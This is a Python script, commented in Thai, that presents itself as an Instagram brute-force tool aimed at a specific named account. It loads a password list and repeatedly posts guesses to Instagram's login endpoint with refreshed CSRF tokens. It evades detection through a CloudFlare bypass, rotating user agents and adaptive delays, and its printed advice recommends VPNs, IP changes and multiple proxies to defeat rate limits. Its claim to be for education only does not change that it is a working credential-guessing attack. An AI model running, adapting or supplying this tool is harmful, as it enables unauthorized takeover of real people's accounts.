#!/usr/bin/env python3
"""
Instagram Brute Force Tool - HTTP 400 Error Fixed Version
แก้ไขปัญหา HTTP 400 Bad Request ด้วยการปรับปรุง:
- Payload format ใหม่ตาม Instagram API ปัจจุบัน
- Headers ครบถ้วนและถูกต้อง  
- Session management ที่ดีขึ้น
- Request validation และ debugging

Target: alx.trading
พัฒนาเพื่อการศึกษาและการทดสอบความปลอดภัยเท่านั้น
"""

import requests
import time
import random
import json
import re
import sys
import os
from urllib.parse import quote
import hashlib

# ติดตั้ง modules ที่จำเป็น
try:
    import cloudscraper
    from fake_useragent import UserAgent
except ImportError:
    print("🔧 กำลังติดตั้ง required packages...")
    os.system("pip install cloudscraper fake-useragent")
    import cloudscraper
    from fake_useragent import UserAgent


class InstagramBruteForcer400Fixed:
    """
    Instagram Brute Force Tool - แก้ไข HTTP 400 Error

    ✅ Fixed Issues:
    - Correct payload format for 2025 Instagram API
    - Complete headers with all required fields
    - Proper CSRF token handling and refresh
    - Enhanced session management
    - Request debugging and validation
    """

    def __init__(self, target_username):
        """เริ่มต้น Instagram Brute Forcer"""
        self.target_username = target_username
        self.found_password = None

        # สถิติ
        self.attempts = 0
        self.failed_attempts = 0
        self.rate_limited = 0
        self.bad_requests = 0  # นับ HTTP 400

        # การจัดการ delay
        self.base_delay = 2.0      # delay ขั้นต่ำ
        self.max_delay = 30.0      # delay สูงสุด
        self.current_delay = self.base_delay

        # เตรียม User-Agent generator
        self.ua = UserAgent()

        # สร้าง cloudscraper session (ป้องกัน CloudFlare)
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )

        # เตรียม session cookies และ headers พื้นฐาน
        self.setup_session()

        print(f"🎯 เป้าหมาย: {target_username}")
        print(f"🛡️ CloudFlare bypass: ✅")
        print(f"🎭 Random User-Agent: ✅")
        print(f"⚙️ HTTP 400 Fix: ✅")

    def setup_session(self):
        """ตั้งค่า session เริ่มต้น"""
        try:
            # เข้าไปหน้า Instagram เพื่อสร้าง session
            print("🔧 กำลังสร้าง session...")

            # กำหนด User-Agent และ headers พื้นฐาน
            self.scraper.headers.update({
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'max-age=0'
            })

            # เข้าหน้าแรก Instagram
            response = self.scraper.get(
                'https://www.instagram.com/', timeout=15)

            if response.status_code == 200:
                print("✅ Session สร้างสำเร็จ")
                return True
            else:
                print(f"⚠️ Session response: {response.status_code}")
                return False

        except Exception as e:
            print(f"❌ ข้อผิดพลาดใน session setup: {e}")
            return False

    def get_csrf_token_advanced(self):
        """
        ดึง CSRF token ใหม่ล่าสุดจาก Instagram
        ใช้วิธีที่ปรับปรุงแล้วเพื่อแก้ไข HTTP 400
        """
        try:
            print("🔐 กำลังดึง CSRF token...")

            # ไปหน้า login เพื่อดึง token ใหม่
            login_page = self.scraper.get(
                'https://www.instagram.com/accounts/login/',
                timeout=15
            )

            if login_page.status_code != 200:
                print(f"❌ ไม่สามารถเข้า login page: {login_page.status_code}")
                return None

            # วิธีที่ 1: ดึงจาก cookies
            csrf_token = None
            for cookie in self.scraper.cookies:
                if cookie.name == 'csrftoken':
                    csrf_token = cookie.value
                    break

            # วิธีที่ 2: ดึงจาก HTML หาก cookies ไม่มี
            if not csrf_token:
                csrf_match = re.search(
                    r'"csrf_token":"([^"]+)"', login_page.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)

            # วิธีที่ 3: ดึงจาก meta tag
            if not csrf_token:
                meta_match = re.search(
                    r'<meta name="csrf-token" content="([^"]+)"', login_page.text)
                if meta_match:
                    csrf_token = meta_match.group(1)

            if csrf_token:
                print(f"✅ CSRF token: {csrf_token[:10]}...")
                return csrf_token
            else:
                print("⚠️ ไม่พบ CSRF token")
                return None

        except Exception as e:
            print(f"❌ ข้อผิดพลาดในการดึง CSRF token: {e}")
            return None

    def create_instagram_payload_2025(self, password, csrf_token):
        """
        สร้าง payload ที่ถูกต้องสำหรับ Instagram API 2025
        แก้ไขปัญหา HTTP 400 ด้วยการใช้ format ที่ถูกต้อง
        """
        # สร้าง timestamp ปัจจุบัน
        timestamp = int(time.time())

        # สร้าง encrypted password ตามรูปแบบ Instagram
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"

        # Payload แบบใหม่ที่แก้ไข HTTP 400
        payload = {
            'username': self.target_username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',
            'queryParams': '{}'
        }

        return payload

    def create_instagram_headers_2025(self, csrf_token):
        """
        สร้าง headers ที่ครบถ้วนสำหรับ Instagram API 2025
        """
        # สุ่ม User-Agent ใหม่
        user_agent = self.ua.random

        headers = {
            'User-Agent': user_agent,
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Origin': 'https://www.instagram.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-CH-UA': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }

        return headers

    def debug_request(self, response, password):
        """Debug request เมื่อเกิด HTTP 400"""
        print(f"\n🔍 DEBUG HTTP 400 - Password: {password}")
        print(f"📊 Status Code: {response.status_code}")
        print(f"📝 Response Headers: {dict(response.headers)}")

        try:
            response_text = response.text[:500]  # แสดงแค่ 500 ตัวอักษรแรก
            print(f"📄 Response Body: {response_text}")

            # ลองแปลง JSON ถ้าเป็นไปได้
            if response.headers.get('content-type', '').startswith('application/json'):
                response_data = response.json()
                print(f"📋 JSON Response: {response_data}")

        except Exception as e:
            print(f"⚠️ ไม่สามารถแสดง response body: {e}")

    def attempt_login_fixed(self, password):
        """
        ลองล็อกอินด้วยการแก้ไข HTTP 400 Error

        Args:
            password (str): รหัสผ่านที่จะลอง

        Returns:
            tuple: (success, message)
        """
        self.attempts += 1
        print(f"\n🔑 ครั้งที่ {self.attempts}: ลองรหัสผ่าน '{password}'")

        # ดึง CSRF token ใหม่ทุกครั้ง
        csrf_token = self.get_csrf_token_advanced()
        if not csrf_token:
            return False, "ไม่สามารถดึง CSRF token ได้"

        # สร้าง payload และ headers ที่แก้ไขแล้ว
        payload = self.create_instagram_payload_2025(password, csrf_token)
        headers = self.create_instagram_headers_2025(csrf_token)

        try:
            # ส่ง POST request
            response = self.scraper.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=payload,
                headers=headers,
                timeout=20,
                allow_redirects=False  # ไม่ follow redirect
            )

            # วิเคราะห์ response
            if response.status_code == 200:
                try:
                    result = response.json()

                    if result.get('authenticated'):
                        print(f"🎉 สำเร็จ! รหัสผ่านถูกต้อง: {password}")
                        self.found_password = password
                        return True, "ล็อกอินสำเร็จ"

                    elif result.get('message'):
                        message = result.get('message')
                        print(f"❌ ล้มเหลว: {message}")
                        self.failed_attempts += 1

                        if 'rate' in message.lower():
                            self.adaptive_delay(rate_limited=True)
                        else:
                            self.adaptive_delay(rate_limited=False)

                        return False, message

                    else:
                        print(f"❌ รหัสผ่านผิด")
                        self.failed_attempts += 1
                        self.adaptive_delay(rate_limited=False)
                        return False, "รหัสผ่านไม่ถูกต้อง"

                except json.JSONDecodeError:
                    print(f"⚠️ Response ไม่ใช่ JSON")
                    return False, "Invalid JSON response"

            elif response.status_code == 400:
                # HTTP 400 - แสดง debug info
                self.bad_requests += 1
                print(
                    f"⚠️ HTTP 400 Bad Request (ครั้งที่ {self.bad_requests})")

                # Debug request
                self.debug_request(response, password)

                # ลองแก้ไขโดยการรอแล้วลองใหม่
                if self.bad_requests < 3:
                    print(f"🔄 รอแล้วลองใหม่...")
                    time.sleep(5)
                    self.adaptive_delay(rate_limited=True)

                return False, "HTTP 400 Bad Request"

            elif response.status_code == 429:
                self.rate_limited += 1
                print(
                    f"🚨 429 Too Many Requests! (ครั้งที่ {self.rate_limited})")
                self.adaptive_delay(rate_limited=True)
                return False, "โดน rate limit"

            else:
                print(f"⚠️ HTTP {response.status_code}: {response.reason}")
                return False, f"HTTP {response.status_code}"

        except requests.exceptions.RequestException as e:
            print(f"❌ Network error: {e}")
            return False, f"Network error: {e}"

        except Exception as e:
            print(f"❌ Unexpected error: {e}")
            return False, f"Unexpected error: {e}"

    def adaptive_delay(self, rate_limited=False):
        """จัดการ delay แบบ adaptive"""
        if rate_limited:
            self.current_delay = min(self.current_delay * 2, self.max_delay)
            print(f"🚨 เพิ่ม delay เป็น {self.current_delay:.1f} วินาที")
        else:
            self.current_delay = max(self.current_delay * 0.9, self.base_delay)

        actual_delay = self.current_delay + \
            random.uniform(-0.2, 0.2) * self.current_delay
        print(f"⏳ รอ {actual_delay:.1f} วินาที...")
        time.sleep(actual_delay)

    def brute_force_fixed(self, passwords, max_attempts=None):
        """
        เริ่ม brute force attack (เวอร์ชั่นแก้ไข HTTP 400)

        Args:
            passwords (list): รายการรหัสผ่าน
            max_attempts (int): จำกัดจำนวนครั้งที่ลอง

        Returns:
            bool: True ถ้าพบรหัสผ่าน
        """
        print(f"\n🚀 เริ่มการโจมตี {self.target_username}")
        print(f"📋 จำนวนรหัสผ่าน: {len(passwords):,}")

        if max_attempts:
            print(f"🔢 จำกัดการลองที่: {max_attempts} ครั้ง")
            passwords = passwords[:max_attempts]

        start_time = time.time()

        for i, password in enumerate(passwords, 1):
            success, message = self.attempt_login_fixed(password)

            if success:
                elapsed = time.time() - start_time
                print(f"\n🎉 พบรหัสผ่าน! {password}")
                print(f"⏱️ ใช้เวลา: {elapsed:.1f} วินาที")
                print(f"🔢 ลองทั้งหมด: {self.attempts} ครั้ง")
                return True

            # แสดง progress ทุก 50 ครั้ง
            if i % 50 == 0:
                elapsed = time.time() - start_time
                rate = i / elapsed if elapsed > 0 else 0
                print(
                    f"\n📊 Progress: {i}/{len(passwords)} ({i/len(passwords)*100:.1f}%)")
                print(f"⚡ อัตรา: {rate:.1f} attempts/sec")
                print(f"❌ ล้มเหลว: {self.failed_attempts}")
                print(f"🚨 Rate limited: {self.rate_limited}")
                print(f"⚠️ HTTP 400: {self.bad_requests}")

            # หยุดถ้า HTTP 400 มากเกินไป
            if self.bad_requests >= 5:
                print(f"\n⚠️ HTTP 400 มากเกินไป ({self.bad_requests} ครั้ง)")
                print(f"💡 Instagram อาจเปลี่ยนการรักษาความปลอดภัย")
                print(f"🔄 ลองใหม่ในภายหลัง หรือใช้วิธีอื่น")
                break

        elapsed = time.time() - start_time
        print(f"\n💔 ไม่พบรหัสผ่าน")
        print(f"⏱️ ใช้เวลาทั้งหมด: {elapsed:.1f} วินาที")
        return False

    def print_summary(self):
        """แสดงสรุปผลการโจมตี"""
        print(f"\n" + "="*60)
        print(f"📊 สรุปการโจมตี {self.target_username}:")
        print(f"   🔢 ลองทั้งหมด: {self.attempts:,} ครั้ง")
        print(f"   ❌ ล้มเหลว: {self.failed_attempts:,} ครั้ง")
        print(f"   🚨 Rate limited: {self.rate_limited} ครั้ง")
        print(f"   ⚠️ HTTP 400: {self.bad_requests} ครั้ง")

        if self.found_password:
            print(f"   🎉 รหัสผ่านที่พบ: {self.found_password}")

        # คำแนะนำ
        if self.bad_requests > 0:
            print(f"\n💡 คำแนะนำสำหรับ HTTP 400:")
            print(f"   - Instagram อาจเปลี่ยน API format")
            print(f"   - ลองใช้ browser automation แทน")
            print(f"   - ใช้ tool อื่นที่อัปเดตแล้ว")

        if self.rate_limited > 3:
            print(f"\n💡 คำแนะนำสำหรับ Rate Limit:")
            print(f"   - ใช้ VPN หรือเปลี่ยน IP")
            print(f"   - รอหลายชั่วโมงก่อนลองใหม่")
            print(f"   - ใช้ proxy หลายตัว")


def load_password_list(filename):
    """โหลดรายการรหัสผ่านจากไฟล์"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        return passwords
    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์: {filename}")
        return []
    except Exception as e:
        print(f"❌ ข้อผิดพลาดในการอ่านไฟล์: {e}")
        return []


def main():
    """ฟังก์ชั่นหลักสำหรับทดสอบการแก้ไข HTTP 400"""
    print("🔧 Instagram Brute Force - HTTP 400 Error Fixed")
    print("=" * 50)

    # เป้าหมาย
    target_username = "alx.trading"

    # โหลดรหัสผ่าน
    password_file = "/workspaces/sugarglitch-realops/passwords.txt"
    passwords = load_password_list(password_file)

    if not passwords:
        print("❌ ไม่มีรหัสผ่านให้ลอง")
        return

    print(f"✅ โหลดรหัสผ่าน {len(passwords):,} ตัว")

    # แสดงตัวอย่าง
    print(f"\n🔍 ตัวอย่างรหัสผ่าน:")
    for i, pwd in enumerate(passwords[:5], 1):
        print(f"   {i}. {pwd}")
    print("   ...")

    # ยืนยัน
    confirm = input(
        f"\n⚠️ เริ่มทดสอบการแก้ไข HTTP 400 กับ {target_username}? (y/N): ")
    if confirm.lower() != 'y':
        print("❌ ยกเลิก")
        return

    # เริ่มโจมตี
    brute_forcer = InstagramBruteForcer400Fixed(target_username)

    # ลองแค่ 100 รหัสผ่านแรกเพื่อทดสอบ
    test_passwords = passwords[:100]

    print(f"\n🧪 ทดสอบด้วย {len(test_passwords)} รหัสผ่านแรก")
    success = brute_forcer.brute_force_fixed(test_passwords)

    # แสดงสรุป
    brute_forcer.print_summary()

    if success:
        print(f"\n🎉 สำเร็จ! พบรหัสผ่าน: {brute_forcer.found_password}")
    else:
        print(f"\n💔 ไม่พบรหัสผ่านในการทดสอบนี้")


if __name__ == "__main__":
    main()
